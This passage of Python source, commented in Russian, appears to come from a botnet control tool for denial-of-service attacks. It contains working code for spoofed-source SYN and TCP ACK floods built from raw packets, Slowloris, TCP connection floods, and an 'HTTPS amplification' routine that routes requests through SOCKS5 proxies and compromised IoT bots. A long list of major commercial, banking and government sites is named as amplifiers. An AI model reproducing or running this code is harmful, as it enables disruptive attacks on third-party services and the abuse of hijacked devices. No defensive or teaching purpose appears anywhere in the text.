            ('pcloud.com', 443),
            
            # 🛒 МАСШТАБНЫЕ ИНТЕРНЕТ-МАГАЗИНЫ
            ('amazon.com', 443),
            ('ebay.com', 443),
            ('aliexpress.com', 443),
            ('walmart.com', 443),
            ('target.com', 443),
            ('bestbuy.com', 443),
            ('newegg.com', 443),
            
            # 📰 МИРОВЫЕ НОВОСТНЫЕ ПОРТАЛЫ
            ('bbc.com', 443),
            ('cnn.com', 443),
            ('nytimes.com', 443),
            ('reuters.com', 443),
            ('theguardian.com', 443),
            ('washingtonpost.com', 443),
            
            # 🔧 КОРПОРАТИВНЫЕ СИСТЕМЫ И БИЗНЕС-ПЛАТФОРМЫ
            ('salesforce.com', 443),
            ('oracle.com', 443),
            ('sap.com', 443),
            ('microsoft.com', 443),
            ('ibm.com', 443),
            ('adobe.com', 443),
            
            # 📱 СОЦИАЛЬНЫЕ СЕТИ И МЕДИА-ПЛАТФОРМЫ
            ('facebook.com', 443),
            ('instagram.com', 443),
            ('twitter.com', 443),
            ('tiktok.com', 443),
            ('linkedin.com', 443),
            ('pinterest.com', 443),
            
            # 🎵 МУЗЫКАЛЬНЫЕ И АУДИО СЕРВИСЫ
            ('spotify.com', 443),
            ('soundcloud.com', 443),
            ('deezer.com', 443),
            ('apple.com', 443),
            
            # 🏦 ФИНАНСОВЫЕ И БАНКОВСКИЕ СИСТЕМЫ
            ('paypal.com', 443),
            ('visa.com', 443),
            ('mastercard.com', 443),
            ('jpmorganchase.com', 443),
            ('bankofamerica.com', 443),
            ('wellsfargo.com', 443),
            
            # 🏢 ПРАВИТЕЛЬСТВЕННЫЕ И ОБРАЗОВАТЕЛЬНЫЕ РЕСУРСЫ
            ('usa.gov', 443),
            ('nasa.gov', 443),
            ('whitehouse.gov', 443),
            ('harvard.edu', 443),
            ('mit.edu', 443),
            ('stanford.edu', 443),
            
            # 🚚 ЛОГИСТИКА И ТРАНСПОРТ
            ('ups.com', 443),
            ('fedex.com', 443),
            ('dhl.com', 443),
            ('usps.com', 443),
            
            # 🏨 КРУПНЫЕ СЕТИ ОТЕЛЕЙ И ПУТЕШЕСТВИЙ
            ('booking.com', 443),
            ('expedia.com', 443),
            ('airbnb.com', 443),
            ('tripadvisor.com', 443),
            ('marriott.com', 443),
            ('hilton.com', 443),
            
            # 🏢 АВТОМОБИЛЬНЫЕ КОМПАНИИ
            ('toyota.com', 443),
            ('ford.com', 443),
            ('bmw.com', 443),
            ('mercedes-benz.com', 443),
            ('volkswagen.com', 443),
            
            # 🔬 НАУЧНЫЕ И ИССЛЕДОВАТЕЛЬСКИЕ ЦЕНТРЫ
            ('nature.com', 443),
            ('sciencemag.org', 443),
            ('arxiv.org', 443),
            ('researchgate.net', 443),
            
            # 🌐 ПОИСКОВИКИ И IT-ГИГАНТЫ
            ('google.com', 443),
            ('bing.com', 443),
            ('yahoo.com', 443),
            ('baidu.com', 443),
            ('duckduckgo.com', 443),
            
            # 🛠️ ДОПОЛНИТЕЛЬНЫЕ МОЩНЫЕ СЕРВИСЫ
            ('stackoverflow.com', 443),
            ('github.com', 443),
            ('gitlab.com', 443),
            ('docker.com', 443),
            ('kubernetes.io', 443),
            ('redhat.com', 443),
        ]

        def _find_https_amplification_servers():
            """Находит серверы, подходящие для HTTPS amplification"""
            https_servers = default_amplifiers.copy()
            
            # Загружаем дополнительные серверы из файла если есть
            if os.path.exists("https_servers.txt"):
                try:
                    with open("https_servers.txt", 'r') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                if ':' in line:
                                    host, port = line.split(':')
                                    https_servers.append((host.strip(), int(port.strip())))
                                else:
                                    https_servers.append((line.strip(), 443))
                except Exception as e:
                    print(f"⚠️ Ошибка загрузки HTTPS серверов: {e}")
            
            return https_servers

        def https_amplification_single(device):
            requests_sent = 0
            bytes_sent = 0
            estimated_amplified_bytes = 0
            failed_requests = 0
            
            try:
                print(f"🔒 {device.ip} начинает HTTPS Amplification атаку...")
                start_time = time.time()
                
                # Получаем список серверов для атаки
                https_servers = _find_https_amplification_servers()
                
                if not https_servers:
                    print(f"❌ {device.ip}: Нет HTTPS серверов для amplification!")
                    return 0, 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем случайный HTTPS сервер
                        target_host, target_port = random.choice(https_servers)
                        
                        # Определяем, использовать ли SOCKS5 прокси
                        if device.bot_type == "socks5" and self.socks5_available:
                            # Используем SOCKS5 для HTTPS соединения
                            try:
                                sock = socks.socksocket()
                                if device.username and device.password:
                                    sock.set_proxy(socks.SOCKS5, device.ip, device.port, 
                                                username=device.username, password=device.password)
                                else:
                                    sock.set_proxy(socks.SOCKS5, device.ip, device.port)
                                sock.settimeout(15)
                                
                                # Устанавливаем SSL поверх SOCKS5
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
                                ssl_sock.connect((target_host, target_port))
                                
                                # Отправляем amplification запрос
                                request_types = [
                                    "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n\r\n",
                                    "GET /api/v1/products HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: application/json\r\nConnection: keep-alive\r\n\r\n",
                                    "GET /wp-json/wp/v2/posts HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept: application/json\r\nConnection: keep-alive\r\n\r\n"
                                ]
                                
                                request_template = random.choice(request_types)
                                request = request_template.format(target_host, random.choice(self.user_agents))
                                ssl_sock.send(request.encode())
                                
                                # Читаем ответ для оценки amplification
                                response_size = 0
                                try:
                                    while True:
                                        chunk = ssl_sock.recv(8192)
                                        if not chunk:
                                            break
                                        response_size += len(chunk)
                                        if response_size > 50000:  # Ограничиваем размер
                                            break
                                except socket.timeout:
                                    pass
                                
                                request_size = len(request)
                                amplification_factor = max(1, response_size / max(request_size, 1))
                                
                                requests_sent += 1
                                bytes_sent += request_size
                                estimated_amplified_bytes += response_size
                                
                                attack_stats['total_requests'] += 1
                                attack_stats['total_bytes_sent'] += request_size
                                attack_stats['estimated_amplified_bytes'] += response_size
                                
                                ssl_sock.close()
                                
                            except Exception as e:
                                failed_requests += 1
                                attack_stats['failed_requests'] += 1
                                continue
                        
                        else:
                            # Прямое HTTPS соединение для IoT устройств
                            request_size, response_size = _create_https_amplification_request(target_host)
                            
                            if request_size > 0 and response_size > 0:
                                requests_sent += 1
                                bytes_sent += request_size
                                estimated_amplified_bytes += response_size
                                
                                attack_stats['total_requests'] += 1
                                attack_stats['total_bytes_sent'] += request_size
                                attack_stats['estimated_amplified_bytes'] += response_size
                            else:
                                failed_requests += 1
                                attack_stats['failed_requests'] += 1
                        
                        # Задержка между запросами
                        time.sleep(random.uniform(1.0, 3.0))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                mb_sent = bytes_sent / 1024 / 1024
                mb_amplified = estimated_amplified_bytes / 1024 / 1024
                
                print(f"✅ {device.ip} отправил {requests_sent} HTTPS запросов")
                print(f"   📤 Отправлено: {mb_sent:.2f} МБ")
                print(f"   💥 Оценка усиленного трафика: {mb_amplified:.2f} МБ")
                print(f"   📊 Средний коэффициент усиления: {estimated_amplified_bytes/max(bytes_sent, 1):.1f}x")
                
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(all_active_bots, attack_stats, https_amplification_single, "HTTPS Amplification")

    def _create_amplification_http_request(self, host):
        """Создает HTTP запрос для amplification"""
        
        # 🎯 ТИПЫ ЗАПРОСОВ ДЛЯ БОЛЬШИХ ОТВЕТОВ
        amplification_requests = [
            # 1. API запросы с большими JSON ответами
            f"GET /api/v1/products HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(self.user_agents)}\r\nAccept: application/json\r\nConnection: close\r\n\r\n",
            
            # 2. Запросы больших файлов
            f"GET /downloads/large-file.zip HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(self.user_agents)}\r\nAccept: */*\r\nConnection: close\r\n\r\n",
            
            # 3. WordPress API
            f"GET /wp-json/wp/v2/posts HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(self.user_agents)}\r\nAccept: application/json\r\nConnection: close\r\n\r\n",
            
            # 4. GraphQL запросы
            f"POST /graphql HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(self.user_agents)}\r\nContent-Type: application/json\r\nContent-Length: 150\r\nConnection: close\r\n\r\n" + 
            '{"query":"{ products { id name description images { url } variants { price stock } } }"}',
            
            # 5. Запросы каталогов
            f"GET /catalog/products HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(self.user_agents)}\r\nAccept: application/json\r\nConnection: close\r\n\r\n",
            
            # 6. Запросы с большими заголовками
            f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(self.user_agents)}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: close\r\n\r\n"
        ]
        
        return random.choice(amplification_requests).encode()

    def load_https_amplifiers(self, filename="https_amplifiers.txt"):
        """Загружает серверы для HTTPS amplification"""
        amplifiers = []
        
        # Используем тот же список default_amplifiers
        default_amplifiers = [
            ('cloudflare.com', 443),
            ('google.com', 443),
            ('facebook.com', 443),
            ('amazon.com', 443),
            ('microsoft.com', 443),
            ('apple.com', 443),
            ('youtube.com', 443),
            ('netflix.com', 443),
            ('stackoverflow.com', 443),
            ('github.com', 443),
        ]
        
        # Загружаем из файла если есть
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if ':' in line:
                                host, port = line.split(':')
                                amplifiers.append((host.strip(), int(port.strip())))
                            else:
                                amplifiers.append((line.strip(), 443))
                print(f"✅ Загружено {len(amplifiers)} усилителей из {filename}")
            except Exception as e:
                print(f"❌ Ошибка загрузки {filename}: {e}")
        
        # Добавляем дефолтные
        amplifiers.extend(default_amplifiers)
        
        print(f"🎯 Всего HTTPS усилителей: {len(amplifiers)}")
        return amplifiers

    def syn_flood(self, target_ip, target_port=80, duration=60, packets_per_second=10000):
        """МАКСИМАЛЬНО МОЩНЫЙ SYN flood с оптимизацией производительности"""
        print(f"🌪️ ЗАПУСК МОЩНОГО SYN FLOOD НА {target_ip}:{target_port}")
        
        # Фильтруем только живые IoT боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        
        print(f"🤖 АКТИВНЫЕ БОТЫ: {len(iot_bots)} устройств")
        
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return 0
        
        if not self.raw_socket_available:
            print("⚠️ Raw socket недоступен! Требуются права root")
            return 0

        # Статистика атаки
        attack_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'failed_packets': 0,
            'start_time': time.time(),
            'is_running': True,
            'lock': threading.Lock()
        }

        # ПРЕДВАРИТЕЛЬНО ГОТОВИМ БАЗОВЫЕ ПАКЕТЫ ДЛЯ БЫСТРОЙ ОТПРАВКИ
        def create_packet_batch(batch_size=100):
            batch = []
            for _ in range(batch_size):
                source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                source_port = random.randint(1024, 65535)
                packet = self._create_syn_packet(source_ip, source_port, target_ip, target_port)
                batch.append(packet)
            return batch

        def high_performance_attack(device):
            packets_sent = 0
            bytes_sent = 0
            failed_packets = 0
            
            try:
                print(f"🚀 {device.ip} запускает ВЫСОКОСКОРОСТНУЮ SYN атаку...")
                
                # СОЗДАЕМ НЕСКОЛЬКО RAW SOCKET ДЛЯ ПАРАЛЛЕЛЬНОСТИ
                sockets = []
                for _ in range(5):  # 5 сокетов на устройство
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)  # Увеличиваем буфер
                        sockets.append(sock)
                    except:
                        continue
                
                if not sockets:
                    print(f"❌ {device.ip} не может создать сокеты")
                    return 0, 0

                # ЗАРАНЕЕ ГОТОВИМ ПАКЕТЫ
                print(f"📦 {device.ip} готовит пакеты...")
                packet_batches = []
                for _ in range(10):  # 10 батчей по 100 пакетов
                    packet_batches.append(create_packet_batch(100))
                
                start_time = time.time()
                batch_counter = 0
                
                # ОСНОВНОЙ ЦИКЛ АТАКИ БЕЗ ЗАДЕРЖЕК
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Берем текущий батч пакетов
                        current_batch = packet_batches[batch_counter % len(packet_batches)]
                        current_socket = sockets[batch_counter % len(sockets)]
                        
                        # ОТПРАВЛЯЕМ ВЕСЬ БАТЧ БЕЗ ПАУЗ
                        for packet in current_batch:
                            try:
                                current_socket.sendto(packet, (target_ip, 0))
                                packets_sent += 1
                                bytes_sent += len(packet)
                                
                                with attack_stats['lock']:
                                    attack_stats['total_packets'] += 1
                                    attack_stats['total_bytes'] += len(packet)
                                    
                            except Exception as e:
                                failed_packets += 1
                                with attack_stats['lock']:
                                    attack_stats['failed_packets'] += 1
                        
                        batch_counter += 1
                        
                        # ОБНОВЛЯЕМ БАТЧИ ДЛЯ РАЗНООБРАЗИЯ (каждые 10 циклов)
                        if batch_counter % 10 == 0:
                            packet_batches[batch_counter % len(packet_batches)] = create_packet_batch(100)
                        
                        # МИНИМАЛЬНАЯ ПАУЗА ТОЛЬКО ДЛЯ КОНТРОЛЯ СКОРОСТИ
                        if packets_per_second > 0:
                            time.sleep(0.01)  # Контроль скорости вместо фиксированной задержки
                            
                    except Exception as e:
                        failed_packets += 1
                        continue
                
                # Закрываем все сокеты
                for sock in sockets:
                    try:
                        sock.close()
                    except:
                        pass
                
                mb_sent = bytes_sent / 1024 / 1024
                pps = packets_sent / duration if duration > 0 else packets_sent
                print(f"✅ {device.ip} ОТПРАВИЛ: {packets_sent} пакетов ({mb_sent:.2f} МБ) | {pps:.0f} pps | Ошибок: {failed_packets}")
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ КРИТИЧЕСКАЯ ОШИБКА У {device.ip}: {e}")
                return 0, 0

        # ЗАПУСКАЕМ МНОГОПОТОЧНУЮ АТАКУ С ОПТИМАЛЬНЫМИ НАСТРОЙКАМИ
        print("⚡ ЗАПУСК МНОГОПОТОЧНОЙ АТАКИ...")
        
        results = self._run_attack(iot_bots, attack_stats, high_performance_attack, "SYN", max_workers=min(len(iot_bots), 1000))
        
        # ФИНАЛЬНАЯ СТАТИСТИКА
        total_duration = time.time() - attack_stats['start_time']
        total_mb = attack_stats['total_bytes'] / 1024 / 1024
        avg_pps = attack_stats['total_packets'] / total_duration if total_duration > 0 else 0
        
        print(f"\n🎯 АТАКА ЗАВЕРШЕНА:")
        print(f"📊 Всего пакетов: {attack_stats['total_packets']:,}")
        print(f"💾 Всего данных: {total_mb:.2f} МБ")
        print(f"⚡ Средняя скорость: {avg_pps:.0f} пакетов/сек")
        print(f"🚫 Ошибок: {attack_stats['failed_packets']}")
        print(f"⏱️ Продолжительность: {total_duration:.2f} сек")
        
        return results


    def _create_ip_headersyn(self, source_ip, dest_ip, data_length, protocol):
        """Создает IP заголовок (ОКОНЧАТЕЛЬНАЯ ВЕРСИЯ)"""
        try:
            ip_ihl = 5
            ip_ver = 4
            ip_tos = 0
            ip_tot_len = 20 + data_length  # IP header + data
            ip_id = random.randint(0, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = protocol
            ip_check = 0
            ip_saddr = socket.inet_aton(source_ip)
            ip_daddr = socket.inet_aton(dest_ip)
            
            ip_ihl_ver = (ip_ver << 4) + ip_ihl
            
            # IP header без checksum
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                  ip_ihl_ver, ip_tos, ip_tot_len,
                                  ip_id, ip_frag_off, ip_ttl, ip_proto,
                                  ip_check, ip_saddr, ip_daddr)
            
            # Вычисляем checksum
            ip_check = self._calculate_checksum(ip_header)
            
            # Пересобираем с правильным checksum
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                  ip_ihl_ver, ip_tos, ip_tot_len,
                                  ip_id, ip_frag_off, ip_ttl, ip_proto,
                                  socket.htons(ip_check), ip_saddr, ip_daddr)
            
            return ip_header
        except Exception as e:
            print(f"❌ Ошибка в _create_ip_header: {e}")
            raise

    def _create_syn_packet(self, source_ip, source_port, dest_ip, dest_port):
        """Создает полный IP+TCP пакет для SYN flood (ОКОНЧАТЕЛЬНАЯ ВЕРСИЯ)"""
        try:
            # Сначала создаем TCP заголовок
            tcp_header = self._create_tcp_header(source_ip, source_port, dest_ip, dest_port)
            
            # Затем создаем IP заголовок с правильными параметрами
            ip_header = self._create_ip_headersyn(source_ip, dest_ip, len(tcp_header), socket.IPPROTO_TCP)
            
            return ip_header + tcp_header
        except Exception as e:
            print(f"❌ Ошибка в _create_syn_packet: {e}")
            return b''

    def _create_tcp_header(self, source_ip, source_port, dest_ip, dest_port):
        """Создает TCP заголовок для SYN пакета (ИСПРАВЛЕННЫЙ)"""
        seq_number = random.randint(0, 0xFFFFFFFF)
        ack_number = 0
        data_offset = 5 << 4  # 5 words * 4 bytes = 20 bytes
        tcp_flags = 0x02  # SYN flag
        
        window = 5840  # Стандартное значение
        tcp_checksum = 0
        urg_pointer = 0
        
        # TCP header без checksum
        tcp_header = struct.pack('!HHLLBBHHH', 
                               source_port, dest_port,
                               seq_number, ack_number,
                               data_offset, tcp_flags,
                               window, tcp_checksum, urg_pointer)
        
        # Pseudo header для вычисления checksum
        pseudo_header = struct.pack('!4s4sBBH',
                                  socket.inet_aton(source_ip),
                                  socket.inet_aton(dest_ip),
                                  0, socket.IPPROTO_TCP, len(tcp_header))
        
        # Вычисляем TCP checksum
        tcp_checksum = self._calculate_checksum(pseudo_header + tcp_header)
        
        # Пересобираем с правильным checksum
        tcp_header = struct.pack('!HHLLBBHHH', 
                               source_port, dest_port,
                               seq_number, ack_number,
                               data_offset, tcp_flags,
                               window, tcp_checksum, urg_pointer)
        
        return tcp_header

    def slowloris_attack(self, target_ip, target_port=80, duration=60):
        """Slowloris атака"""
        print(f"🐌 Запуск Slowloris атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        # Объединяем все активные боты
        all_active_bots = iot_bots + socks5_bots

        # ИСПРАВЛЕНИЕ: проверяем all_active_bots вместо active_devices
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        attack_stats = {
            'total_connections': 0,
            'active_connections': 0,
            'failed_connections': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def slowloris_attack_single(device):
            connections_created = 0
            
            try:
                print(f"🐌 {device.ip} начинает Slowloris атаку...")
                start_time = time.time()
                sockets = []
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем медленное соединение
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        sock.connect((target_ip, target_port))
                        
                        # Отправляем частичный HTTP запрос
                        partial_request = f"GET /{random.randint(1000, 9999)} HTTP/1.1\r\nHost: {target_ip}\r\n".encode()
                        sock.send(partial_request)
                        
                        sockets.append(sock)
                        connections_created += 1
                        attack_stats['total_connections'] += 1
                        attack_stats['active_connections'] += 1
                        
                        # Периодически отправляем дополнительные заголовки
                        time.sleep(random.uniform(10, 30))
                        
                        if attack_stats['is_running']:
                            # Добавляем еще заголовки
                            additional_headers = f"User-Agent: {random.choice(self.user_agents)}\r\nAccept: text/html\r\n".encode()
                            sock.send(additional_headers)
                        
                    except Exception:
                        attack_stats['failed_connections'] += 1
                        continue
                
                # Закрываем все соединения
                for sock in sockets:
                    try:
                        sock.close()
                        attack_stats['active_connections'] -= 1
                    except:
                        pass
                
                print(f"✅ {device.ip} создал {connections_created} медленных соединений")
                return connections_created, 0
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # ИСПРАВЛЕНИЕ: используем all_active_bots вместо active_devices
        return self._run_attack(all_active_bots, attack_stats, slowloris_attack_single, "Slowloris", max_workers=5000000000)

    def tcp_connection_flood(self, target_ip, target_port=80, duration=60, max_workers=5000000000):
        """TCP connection flood с автоматическим amplification"""
        amp_servers = self.load_amplification_servers()
        total_amp_servers = sum(len(servers) for servers in amp_servers.values())
        
        if total_amp_servers > 0:
            print(f"🎯 Обнаружены {total_amp_servers} amplification серверов, запускаем комбинированную атаку...")
            import threading
            amp_thread = threading.Thread(target=self.smart_amplification_attack, args=(target_ip, duration))
            amp_thread.daemon = True
            amp_thread.start()
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        # Объединяем все активные боты
        all_active_bots = iot_bots + socks5_bots
        # ИСПРАВЛЕНИЕ: используем all_active_bots вместо active_devices
        if not all_active_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        attack_stats = {
            'total_connections': 0,
            'failed_connections': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def tcp_flood_attack(device):
            connections_created = 0
            failed_connections = 0
            
            try:
                print(f"🌊 {device.ip} начинает TCP flood атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Быстро создаем и закрываем соединения
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        sock.connect((target_ip, target_port))
                        
                        connections_created += 1
                        attack_stats['total_connections'] += 1
                        
                        # Немного данных
                        sock.send(b"GET / HTTP/1.1\r\n\r\n")
                        time.sleep(0.1)
                        sock.close()
                        
                        time.sleep(0.01)  # Очень быстрое создание соединений
                        
                    except Exception:
                        failed_connections += 1
                        attack_stats['failed_connections'] += 1
                        continue
                
                print(f"✅ {device.ip} создал {connections_created} TCP соединений, ошибок: {failed_connections}")
                return connections_created, 0
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # ИСПРАВЛЕНИЕ: используем all_active_bots
        return self._run_attack(all_active_bots, attack_stats, tcp_flood_attack, "TCP Flood", max_workers=max_workers)

    def _generate_random_ip(self):
        """Генерирует случайный IP адрес для спуфинга"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

    def _create_raw_ip_header(self, source_ip, dest_ip, data_length):
        """Создает IP заголовок для raw socket"""
        try:
            ip_ihl = 5
            ip_ver = 4
            ip_tos = 0
            ip_tot_len = 20 + data_length
            ip_id = random.randint(0, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0
            ip_saddr = socket.inet_aton(source_ip)
            ip_daddr = socket.inet_aton(dest_ip)
            
            ip_ihl_ver = (ip_ver << 4) + ip_ihl
            
            # IP header без checksum
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                  ip_ihl_ver, ip_tos, ip_tot_len,
                                  ip_id, ip_frag_off, ip_ttl, ip_proto,
                                  ip_check, ip_saddr, ip_daddr)
            
            # Вычисляем checksum
            ip_check = self._calculate_checksum(ip_header)
            
            # Пересобираем с правильным checksum
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                  ip_ihl_ver, ip_tos, ip_tot_len,
                                  ip_id, ip_frag_off, ip_ttl, ip_proto,
                                  socket.htons(ip_check), ip_saddr, ip_daddr)
            
            return ip_header
        except Exception as e:
            print(f"❌ Ошибка создания IP заголовка: {e}")
            return None

    def _create_raw_tcp_ack_header(self, source_ip, source_port, dest_ip, dest_port, seq_number):
        """Создает TCP заголовок с ACK флагом для raw socket"""
        try:
            # TCP параметры
            tcp_source = source_port
            tcp_dest = dest_port
            tcp_seq = seq_number
            tcp_ack_seq = random.randint(0, 0xFFFFFFFF)
            tcp_doff = 5
            tcp_fin = 0
            tcp_syn = 0
            tcp_rst = 0
            tcp_psh = 0
            tcp_ack = 1  # ACK флаг!
            tcp_urg = 0
            tcp_window = socket.htons(5840)
            tcp_check = 0
            tcp_urg_ptr = 0
            
            tcp_offset_res = (tcp_doff << 4)
            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
            
            # TCP заголовок без checksum
            tcp_header = struct.pack('!HHLLBBHHH', 
                                   tcp_source, tcp_dest, 
                                   tcp_seq, tcp_ack_seq,
                                   tcp_offset_res, tcp_flags, 
                                   tcp_window, tcp_check, tcp_urg_ptr)
            
            # Псевдо-заголовок для checksum
            pseudo_header = struct.pack('!4s4sBBH',
                                      socket.inet_aton(source_ip),
                                      socket.inet_aton(dest_ip),
                                      0, socket.IPPROTO_TCP, len(tcp_header))
            
            # Вычисляем checksum
            tcp_check = self._calculate_checksum(pseudo_header + tcp_header)
            
            # Пересобираем с правильным checksum
            tcp_header = struct.pack('!HHLLBBHHH', 
                                   tcp_source, tcp_dest, 
                                   tcp_seq, tcp_ack_seq,
                                   tcp_offset_res, tcp_flags, 
                                   tcp_window, tcp_check, tcp_urg_ptr)
            
            return tcp_header
            
        except Exception as e:
            print(f"❌ Ошибка создания TCP заголовка: {e}")
            return None

    def _calculate_checksum(self, msg):
        """Вычисляет checksum для пакета"""
        s = 0
        for i in range(0, len(msg), 2):
            if i + 1 < len(msg):
                w = (msg[i] << 8) + msg[i + 1]
            else:
                w = (msg[i] << 8) + 0
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def tcp_ack_flood(self, target_ip, target_port=80, duration=60, max_workers=5000000000):
        """TCP ACK Flood - отправка ACK пакетов без установки соединения"""
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🎯 Запуск TCP ACK Flood на {target_ip}:{target_port}")
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'ack_packets_sent': 0,
            'bytes_sent': 0,
            'failed_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def create_ack_packet(source_ip, source_port, dest_ip, dest_port, seq_number):
            """Создает TCP ACK пакет"""
            try:
                # IP заголовок
                ip_header = self._create_raw_ip_header(source_ip, dest_ip, 20)  # 20 bytes for TCP
                
                # TCP заголовок с ACK флагом
                tcp_header = self._create_raw_tcp_ack_header(source_ip, source_port, dest_ip, dest_port, seq_number)
                
                if ip_header is None or tcp_header is None:
                    return None
                    
                return ip_header + tcp_header
            except Exception as e:
                print(f"❌ Ошибка создания ACK пакета: {e}")
                return None

        def _generate_random_ip(self):
            """Генерирует случайный IP адрес для спуфинга"""
            return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

        def ack_flood_attack(device):
            ack_packets_sent = 0
            bytes_sent = 0
            failed_packets = 0
            
            try:
                print(f"📨 {device.ip} начинает TCP ACK Flood...")
                
                # ПРОВЕРКА RAW SOCKET ДОСТУПА
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    print(f"✅ {device.ip}: Raw socket создан успешно")
                except PermissionError:
                    print(f"❌ {device.ip}: Требуются права root для raw socket! Используем TCP соединения...")
                    return fallback_tcp_attack(device)
                except Exception as e:
                    print(f"❌ {device.ip}: Ошибка создания raw socket: {e}")
                    return fallback_tcp_attack(device)
                
                start_time = time.time()
                seq_number = random.randint(0, 0xFFFFFFFF)
                packets_batch = 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Генерируем случайные параметры
                        source_ip = self._generate_random_ip()
                        source_port = random.randint(1024, 65535)
                        
                        # Создаем ACK пакет
                        ack_packet = create_ack_packet(
                            source_ip, source_port, 
                            target_ip, target_port, 
                            seq_number
                        )
                        
                        if ack_packet and len(ack_packet) > 0:
                            # Отправляем пакет
                            sock.sendto(ack_packet, (target_ip, 0))
                            
                            ack_packets_sent += 1
                            bytes_sent += len(ack_packet)
                            packets_batch += 1
                            
                            attack_stats['ack_packets_sent'] += 1
                            attack_stats['bytes_sent'] += len(ack_packet)
                            
                            # Увеличиваем sequence number
                            seq_number = (seq_number + random.randint(1, 1000)) & 0xFFFFFFFF
                        
                        # Прогресс каждые 100 пакетов
                        if packets_batch >= 100:
                            print(f"📦 {device.ip} отправил {ack_packets_sent} ACK пакетов")
                            packets_batch = 0
                            
                        # Минимальная пауза
                        time.sleep(0.001)
                            
                    except Exception as e:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
